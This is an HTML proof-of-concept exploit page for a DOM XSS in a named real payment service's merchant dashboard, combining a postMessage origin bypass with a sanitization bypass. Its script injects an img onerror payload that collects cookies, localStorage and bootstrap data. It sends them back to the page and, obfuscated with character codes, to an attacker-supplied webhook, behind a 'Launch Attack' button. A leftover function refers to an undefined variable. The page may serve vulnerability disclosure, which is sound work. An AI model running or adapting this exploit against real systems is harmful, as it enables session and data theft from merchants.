<!DOCTYPE html>
<html>
<head>
    <title>Square DOM XSS PoC</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #1a1a2e;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            text-align: center;
            max-width: 600px;
            padding: 40px;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #888;
            margin-bottom: 40px;
        }
        .target {
            background: rgba(255,255,255,0.1);
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 30px;
            font-family: monospace;
            font-size: 14px;
            word-break: break-all;
        }
        button {
            background: #ff4757;
            color: white;
            border: none;
            padding: 20px 60px;
            font-size: 20px;
            border-radius: 10px;
            cursor: pointer;
            transition: transform 0.2s, background 0.2s;
        }
        button:hover {
            background: #ff6b81;
            transform: scale(1.05);
        }
        .status {
            margin-top: 30px;
            padding: 15px;
            border-radius: 8px;
            display: none;
        }
        .status.show {
            display: block;
        }
        .status.success {
            background: rgba(46, 213, 115, 0.2);
            border: 1px solid #2ed573;
        }
        .info {
            margin-top: 40px;
            text-align: left;
            background: rgba(255,255,255,0.05);
            padding: 20px;
            border-radius: 8px;
            font-size: 14px;
        }
        .info h3 {
            color: #ff6b81;
            margin-bottom: 10px;
        }
        .info ul {
            margin-left: 20px;
            color: #aaa;
        }
        .info li {
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Square DOM XSS PoC</h1>
        <p class="subtitle">postMessage Origin Bypass + Sanitization Bypass</p>

        <div class="target">
            Target: app.squareup.com/dashboard/payment-links/new
        </div>

        <div style="margin-bottom:20px;">
            <label style="display:block;margin-bottom:8px;color:#888;">Webhook URL (get one from webhook.site):</label>
            <input type="text" id="webhookUrl" placeholder="https://webhook.site/your-id" style="width:100%;padding:12px;border-radius:6px;border:1px solid #333;background:#2a2a4a;color:#fff;font-size:14px;">
        </div>

        <button onclick="launchAttack()">Launch Attack</button>

        <div class="status" id="status"></div>

        <div class="info">
            <h3>Attack Flow:</h3>
            <ul>
                <li>1. Opens Square merchant dashboard</li>
                <li>2. Sends malicious postMessage to checkout iframe</li>
                <li>3. XSS executes on checkout.square.site</li>
                <li>4. Steals sensitive data from window.bootstrap</li>
            </ul>
        </div>

        <div class="stolen-data" id="stolenData" style="display:none; margin-top:30px; background:rgba(255,71,87,0.1); border:1px solid #ff4757; border-radius:8px; padding:20px; text-align:left;">
            <h3 style="color:#ff4757; margin-bottom:15px;">Stolen Data:</h3>
            <pre id="dataDisplay" style="background:#0a0a0a; padding:15px; border-radius:5px; overflow:auto; max-height:300px; font-size:12px; color:#2ed573;"></pre>
        </div>
    </div>

<script>
var targetWindow = null;

// Listen for stolen data from XSS
window.addEventListener('message', function(e) {
    if (e.data && e.data.stolen) {
        document.getElementById('stolenData').style.display = 'block';
        document.getElementById('dataDisplay').textContent = JSON.stringify(e.data.stolen, null, 2);
        showStatus('Data exfiltrated successfully!', 'success');
    }
});

function showStatus(msg, type) {
    var el = document.getElementById('status');
    el.textContent = msg;
    el.className = 'status show ' + type;
}

function launchAttack() {
    var webhookUrl = document.getElementById('webhookUrl').value;

    showStatus('Opening target...', 'success');

    targetWindow = window.open('https://app.squareup.com/dashboard/payment-links/new');

    if (!targetWindow) {
        showStatus('Popup blocked. Please allow popups.', 'error');
        return;
    }

    setTimeout(function() {
        showStatus('Injecting XSS payload...', 'success');

        // Build XSS payload
        var xss = 'var d={domain:document.domain,cookies:document.cookie,localStorage:JSON.stringify(localStorage),bootstrap:window.bootstrap};';

        // Send to opener (this page) - use top.opener because XSS is inside iframe
        xss += 'var o=top.opener||opener;if(o){o.postMessage({stolen:d},String.fromCharCode(42));}alert(String.fromCharCode(88,83,83,32,111,110,32)+document.domain);';

        // Exfiltrate to webhook if provided
        if (webhookUrl) {
            xss += 'new Image().src=String.fromCharCode(';
            for (var i = 0; i < webhookUrl.length; i++) {
                xss += webhookUrl.charCodeAt(i);
                if (i < webhookUrl.length - 1) xss += ',';
            }
            xss += ')+String.fromCharCode(63,100,61)+btoa(JSON.stringify(d));';
        }

        var payload = {
            name: 'LINK_PREVIEW',
            data: {
                type: 'INITIALIZE',
                uuid: 'poc-' + Date.now(),
                data: {
                    checkout_link: {
                        id: 'link-1',
                        link_type: 'ITEM_LINK',
                        checkout_link_data: {
                            name: 'Product',
                            link_type: 'ITEM_LINK',
                            order_details: {
                                line_items: [{
                                    item_id: 'item-1',
                                    quantity: { quantity: 1 }
                                }]
                            }
                        }
                    },
                    related_objects: [{
                        type: 'ITEM',
                        id: 'item-1',
                        item_data: {
                            name: 'Test Product',
                            description_html: '',
                            description: '<img src=x onerror="' + xss + '">',
                            variations: [{
                                type: 'ITEM_VARIATION',
                                id: 'var-1',
                                item_variation_data: {
                                    item_id: 'item-1',
                                    name: 'Default',
                                    pricing_type: 'FIXED_PRICING',
                                    price_money: { amount: 1000, currency: 'USD' }
                                }
                            }]
                        }
                    }],
                    settings: {
                        checkout_title: 'Store'
                    }
                }
            }
        };

        // Send to all frames
        for (var i = 0; i < 10; i++) {
            try {
                targetWindow.frames[i].postMessage(payload, '*');
            } catch(e) {}
        }

        showStatus('Payload sent! Waiting for data...', 'success');

    }, 5000);

    function sendPayload() {
      if (!w || w.closed) {
        alert("Target window is not open.");
        return;
      }

      for (let i = 0; i < 10; i++) {
        try {
          w.frames[i].postMessage(payload, '*');
        } catch (e) {}
      }

      console.log('Payload sent');
    }
}
</script>

</body>
</html>
